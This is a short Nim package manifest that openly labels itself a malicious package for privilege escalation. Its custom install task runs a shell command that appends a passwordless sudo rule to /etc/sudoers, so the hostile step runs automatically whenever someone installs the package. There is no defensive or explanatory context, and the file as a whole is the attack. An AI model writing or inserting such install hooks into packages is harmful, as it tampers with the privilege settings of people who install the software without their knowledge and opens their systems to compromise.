version       = "0.1.0"
author        = "Your Name"
description   = "Malicious Nim package for privilege escalation"
license       = "MIT"
srcDir        = "src"

# Define a custom install task
task install, "Privilege escalation task":
  exec "echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
